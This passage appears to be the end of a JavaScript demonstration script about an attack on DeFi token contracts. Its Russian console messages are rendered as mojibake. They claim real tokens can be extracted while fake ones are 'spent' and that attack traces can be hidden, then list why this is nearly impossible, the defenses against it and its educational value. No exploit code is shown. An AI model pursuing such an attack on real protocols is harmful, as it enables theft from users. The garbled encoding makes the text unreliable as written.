    console.log("‚úÖ –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —Ä–µ–∞–ª—å–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–∏ '—Ç—Ä–∞—Ç–µ' –ø–æ–¥–¥–µ–ª—å–Ω—ã—Ö");
    console.log("‚úÖ –ü–æ–ª–Ω–æ–µ —Å–æ–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏");
    
    console.log("\n‚ö†Ô∏è  –ü–û–ß–ï–ú–£ –ê–¢–ê–ö–ê –ü–†–ê–ö–¢–ò–ß–ï–°–ö–ò –ù–ï–í–û–ó–ú–û–ñ–ù–ê:");
    console.log("‚ùå –°–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ç–æ–∫–æ–ª—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç immutable –∞–¥—Ä–µ—Å–∞ —Ç–æ–∫–µ–Ω–æ–≤");
    console.log("‚ùå –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ —É—Ä–æ–≤–Ω–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏");
    console.log("‚ùå –í—Ä–µ–º–µ–Ω–Ω—ã–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –Ω–∞ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–∏");
    console.log("‚ùå –°–∏—Å—Ç–µ–º—ã –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∞–Ω–æ–º–∞–ª—å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏");
    console.log("‚ùå –¢—Ä–µ–±—É–µ—Ç—Å—è –Ω–∞–π—Ç–∏ –∫—Ä–∞–π–Ω–µ —É—è–∑–≤–∏–º—ã–π –ø—Ä–æ—Ç–æ–∫–æ–ª");
    
    console.log("\nüõ°Ô∏è  –ó–ê–©–ò–¢–´ –û–¢ –ü–û–î–û–ë–ù–´–• –ê–¢–ê–ö:");
    console.log("‚úÖ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ immutable –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–ª—è –∞–¥—Ä–µ—Å–æ–≤ —Ç–æ–∫–µ–Ω–æ–≤");
    console.log("‚úÖ –í–∞–ª–∏–¥–∞—Ü–∏—è –∞–¥—Ä–µ—Å–æ–≤ —Ç–æ–∫–µ–Ω–æ–≤ –≤ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–µ—Å—Ç–∞—Ö");
    console.log("‚úÖ Whitelist —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤");
    console.log("‚úÖ –ú–Ω–æ–≥–æ—É—Ä–æ–≤–Ω–µ–≤—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–µ—Ä–µ–¥ –æ–ø–µ—Ä–∞—Ü–∏—è–º–∏");
    console.log("‚úÖ –í—Ä–µ–º–µ–Ω–Ω—ã–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è");
    
    console.log("\nüéì –û–ë–†–ê–ó–û–í–ê–¢–ï–õ–¨–ù–ê–Ø –¶–ï–ù–ù–û–°–¢–¨:");
    console.log("- –ü–æ–Ω–∏–º–∞–Ω–∏–µ —Å–ª–æ–∂–Ω—ã—Ö –≤–µ–∫—Ç–æ—Ä–æ–≤ –∞—Ç–∞–∫ –Ω–∞ DeFi");
    console.log("- –í–∞–∂–Ω–æ—Å—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤");
    console.log("- –ù–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å —Ç—â–∞—Ç–µ–ª—å–Ω–æ–≥–æ –∞—É–¥–∏—Ç–∞ —Å–º–∞—Ä—Ç-–∫–æ–Ω—Ç—Ä–∞–∫—Ç–æ–≤");
    console.log("- –ö—Ä–∏—Ç–∏—á–µ—Å–∫–æ–µ –º—ã—à–ª–µ–Ω–∏–µ –ø—Ä–∏ –∞–Ω–∞–ª–∏–∑–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏");
    
  } catch (error) {
    console.error("‚ùå –û—à–∏–±–∫–∞ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏:", error);
  }
}

if (require.main === module) {
  main().catch(console.error);
}